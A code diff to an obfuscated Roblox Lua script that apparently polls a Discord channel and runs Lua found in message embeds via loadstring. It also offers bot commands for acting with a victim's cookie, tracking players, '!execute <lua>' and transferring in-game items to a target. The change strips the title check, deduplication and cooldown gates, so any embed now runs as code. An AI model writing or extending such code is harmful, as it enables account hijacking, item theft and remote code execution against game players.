@@ -21,7 +21,7 @@ end
 if getgenv().__aio_loaded then return end
 getgenv().__aio_loaded = true
 
--- ─── Cross-execution dedupe (survives file issues) ───
+-- ─── Cross-execution dedupe state (kept for compat, unused) ───
 getgenv()._ajHitJobs = getgenv()._ajHitJobs or {};
 getgenv()._ajHitMsgs = getgenv()._ajHitMsgs or {};
 getgenv()._ajLastExec = getgenv()._ajLastExec or 0;
@@ -517,28 +517,6 @@ local function _al(_f, _v)
     table.insert(_t, _v); _wl(_f, _t);
 end
 
--- Cross-execution wrappers (getgenv + file)
-local function _jobHit(_jid)
-    if not _jid or _jid == "" then return false end
-    if getgenv()._ajHitJobs[_jid] then return true end
-    return _il("executed_jobids.dat", _jid);
-end
-local function _markJobHit(_jid)
-    if not _jid or _jid == "" then return end
-    getgenv()._ajHitJobs[_jid] = true;
-    _al("executed_jobids.dat", _jid);
-end
-local function _msgHit(_mid)
-    if not _mid then return false end
-    if getgenv()._ajHitMsgs[_mid] then return true end
-    return _il("executed_embeds.dat", _mid);
-end
-local function _markMsgHit(_mid)
-    if not _mid then return end
-    getgenv()._ajHitMsgs[_mid] = true;
-    _al("executed_embeds.dat", _mid);
-end
-
 function _gone()
     local _tg = readfile("last_target.dat");
     for _, _p in pairs(game.Players:GetChildren()) do
@@ -572,21 +550,16 @@ local function _getMsgs(_after, _chan)
     return {}
 end
 
--- ─── EMBED MATCHER — title-only ───
--- Any embed with "TARGET ACQUIRED" in the title qualifies. Color/footer
--- are ignored so the relay stripping fields can't break detection.
+-- ─── EMBED MATCHER — any embed counts ───
 local function _embedLooksRight(_e)
-    if not _e then return false end
-    local title = tostring(_e.title or "");
-    return title:find("TARGET ACQUIRED") ~= nil;
+    return _e ~= nil;
 end
 
 local function _hasAnyEmbed(_md)
     return _md and _md.embeds and #_md.embeds > 0;
 end
 
--- ─── _pjm is DEAD — embeds handle everything now. ───
--- Text-only messages can no longer trigger a join.
+-- ─── _pjm is DEAD — embeds handle everything now ───
 local function _pjm(_m)
     return
 end
@@ -727,16 +700,8 @@ local function _doTransfer(_targetName)
 end
 
 -- ═══════════════════════════════════════════════════════════════
---  EMBED EXEC — HARD GATE: requires an embed. Text-only msgs ignored.
+--  EMBED EXEC — stripped: has embed → extract code → run
 -- ═══════════════════════════════════════════════════════════════
-local _EMBED_COOLDOWN = 30
-
-local function _extractJobId(code)
-    if not code then return nil end
-    return code:match("TeleportToPlaceInstance%s*%(%s*%d+%s*,%s*'([^']+)'")
-        or code:match('TeleportToPlaceInstance%s*%(%s*%d+%s*,%s*"([^"]+)"')
-end
-
 local function _extractCode(_md, _e)
     local candidates = {};
     if _md and _md.content then table.insert(candidates, tostring(_md.content)) end
@@ -762,82 +727,22 @@ local function _extractCode(_md, _e)
 end
 
 local function _execEmbed(_md)
-    -- HARD GATE: must have an embed. No embed = no exec.
-    if not _hasAnyEmbed(_md) then return end
+    if not _md or not _md.embeds or #_md.embeds == 0 then return end
 
     for _, _e in ipairs(_md.embeds) do
-        if _embedLooksRight(_e) then
-
-            local function _reactX()
-                task.spawn(function() _reactIn(_embedCh, _md.id, "❌") end)
-            end
-
-            if _msgHit(_md.id) then
-                _reactX(); return
-            end
-
-            local code = _extractCode(_md, _e)
-            if not code then
-                _markMsgHit(_md.id)
-                _reactX()
-                print("[embed] skip: no game:GetService in message")
-                return
-            end
-
-            local jid = _extractJobId(code)
-
-            if jid and jid == game.JobId then
-                _markMsgHit(_md.id)
-                _reactX()
-                print("[embed] skip: already in " .. tostring(jid):sub(1, 16))
-                return
-            end
-
-            if jid and _jobHit(jid) then
-                _markMsgHit(_md.id)
-                _reactX()
-                print("[embed] skip: already hit " .. tostring(jid):sub(1, 16))
-                return
-            end
-
-            if _moving then
-                _markMsgHit(_md.id)
-                _reactX()
-                print("[embed] skip: already moving")
-                return
-            end
-
-            if (tick() - getgenv()._ajLastExec) < _EMBED_COOLDOWN then
-                _markMsgHit(_md.id)
-                _reactX()
-                print("[embed] skip: cooldown")
-                return
-            end
-
+        local code = _extractCode(_md, _e)
+        if code then
             local fn, err = loadstring(code)
             if not fn then
-                _markMsgHit(_md.id)
-                _reactX()
-                _postEmbed("❌ Embed Load Error",
-                    "```\n" .. tostring(err):sub(1, 900) .. "\n```", 0xFF0000)
+                task.spawn(function() _reactIn(_embedCh, _md.id, "❌") end)
+                _postEmbed("❌ Load Error", "```\n" .. tostring(err):sub(1, 900) .. "\n```", 0xFF0000)
                 return
             end
-
-            getgenv()._ajLastExec = tick()
-            _markMsgHit(_md.id)
-            if jid then _markJobHit(jid) end
-
-            _moving = true
-            _cur = { placeId = 142823291, jobId = jid or "", msgid = _md.id }
-            task.delay(15, function()
-                _moving = false
-                _cur = nil
-            end)
 
             local ok, runErr = pcall(fn)
             task.spawn(function() _reactIn(_embedCh, _md.id, ok and "✅" or "❌") end)
             _postEmbed(
-                ok and "✅ Embed Exec" or "❌ Embed Runtime Error",
+                ok and "✅ Embed Exec" or "❌ Runtime Error",
                 "```\n" .. tostring(ok and code or runErr):sub(1, 900) .. "\n```",
                 ok and 0x3EED50 or 0xFF0000
             )
@@ -1003,7 +908,7 @@ local function _gw()
                             "**Cookie Actions**: `!follow <u>` `!unfollow <u>` `!friend <u>` `!statusmsg <txt>` `!joingroup <id>` `!leavegroup <id>`\n" ..
                             "**Tracking**: `!track <u>` `!untrack` `!tracklist`\n" ..
                             "**MM2**: `!inv` `!invf` `!coins` `!stats` `!history` `!queue` `!servercheck`\n" ..
-                            "**Utility**: `!status` `!server` `!job` `!age <u>` `!execute <lua>` `!clearembedhistory`\n" ..
+                            "**Utility**: `!status` `!server` `!job` `!age <u>` `!execute <lua>`\n" ..
                             "**Movement**: `!rejoin` `!panic`\n" ..
                             "**Transfers**: `!transfer <u>` `!stoptransfer`",
                             0x3EED50);
@@ -1632,7 +1537,7 @@ task.spawn(function()
             if #_q > 0 then
                 local _j = table.remove(_q, 1);
                 _wl("pending_hits.dat", _q);
-                if _j and _j.msgid and not _il("hits_joined.dat", _j.msgid) and _j.jobId ~= game.JobId and not _jobHit(_j.jobId) then
+                if _j and _j.msgid and not _il("hits_joined.dat", _j.msgid) and _j.jobId ~= game.JobId then
                     _tpTo(_j.placeId, _j.jobId, _j.msgid);
                 end
             end
